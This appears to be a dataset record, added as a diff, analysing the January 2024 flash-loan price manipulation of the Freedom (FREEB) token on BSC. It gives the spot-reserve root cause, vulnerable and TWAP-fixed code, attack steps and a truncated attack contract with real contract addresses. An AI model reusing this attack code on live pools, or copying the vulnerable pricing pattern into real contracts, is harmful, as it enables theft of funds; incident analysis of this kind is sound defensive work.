@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-01-26_Freedom_FlashLoanPriceManipulation",
+ "source_file": "2024/2024-01-26_Freedom_FlashLoanPriceManipulation.md",
+ "title": "Freedom (FREEB) — Flash Loan-Based buyToken Price Manipulation Analysis",
+ "date": "2024-01-26",
+ "protocol": "Freedom",
+ "chain": "BSC",
+ "loss_raw": "~74 WBNB (~$22,000)",
+ "loss_usd": 22000.0,
+ "root_cause": "The `buyToken()` function uses PancakeSwap pair's `getReserves()` spot reserves as a price oracle, enabling below-market purchases via single-block reserve manipulation",
+ "attack_tx": null,
+ "vulnerable_contract": "FREEB 0xae3ada87",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: price calculation based on spot reserves\nfunction buyToken() external payable {\n    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();\n    // Price derived from spot reserves — manipulable via flash loan\n    uint256 price = uint256(reserve1) * 1e18 / uint256(reserve0);\n    uint256 tokensOut = msg.value * 1e18 / price;\n    FREE.transfer(msg.sender, tokensOut);\n}\n\n//",
+  "// File: Freedom_decompiled.sol\ncontract Freedom {\ncontract Freedom {\n    address public owner;\n\n\n    // Selector: 0x64d3180d\n    function unknown_64d3180d() external {}  // ❌ Vulnerability\n\n    // Selector: 0x587086bd\n    function unknown_587086bd() external {}\n\n    // Selector: 0x070d7c69\n    function unknown_070d7c69() external {}\n\n    // Selector: 0xa39f25e5\n    function unknown_a39f25e5() external {}\n\n    // Selector: 0x4e487b71\n    function Panic(uint256 p0) external {}\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: TWAP-based price calculation\nfunction buyToken() external payable {\n    uint256 price = getTWAPPrice(1800); // Use 30-minute TWAP\n    uint256 tokensOut = msg.value * 1e18 / price;\n    FREE.transfer(msg.sender, tokensOut);\n}"
+ ],
+ "steps": [
+  "→ [1] DODO flash loan: 500 WBNB",
+  "→ [2] Large WBNB → FREE swap (PancakeRouter)",
+  "→ [3] Call buyToken()",
+  "→ [4] FREE → WBNB reverse swap (profit secured)",
+  "→ [5] Repay DODO 500 WBNB + 74 WBNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] DODO flash loan: 500 WBNB\n  │\n  ├─→ [2] Large WBNB → FREE swap (PancakeRouter)\n  │         └─ Manipulates FREE/WBNB pair reserves\n  │\n  ├─→ [3] Call buyToken()\n  │         └─ Purchases FREE tokens at manipulated reserve-based price\n  │\n  ├─→ [4] FREE → WBNB reverse swap (profit secured)\n  │\n  └─→ [5] Repay DODO 500 WBNB + 74 WBNB profit",
+  "interface IFREEB {\n    function buyToken() external payable;\n}\n\ncontract AttackContract {\n    IFREEB   constant freeb  = IFREEB(0xae3ada8787245977832c6dab2d4474d3943527ab);\n    IERC20   constant FREE   = IERC20(0x8A43Eb772416f934DE3DF8F9Af627359632CB53F);\n    IERC20   constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IDODOPool constant dodo  = IDODOPool(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);\n\n    function testExploit() external {\n        // [1] DODO flash loan 500 WBNB\n        dodo.flashLoan(500 ether, 0, address(this), \"\");\n    }\n\n    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata) external {\n        // [2] WBNB → FREE swap (manipulate pool price)\n        swapExactWBNBForFREE(500 ether);\n\n        // [3] Call buyToken — purchase FREE at ma"
+ ]
+}
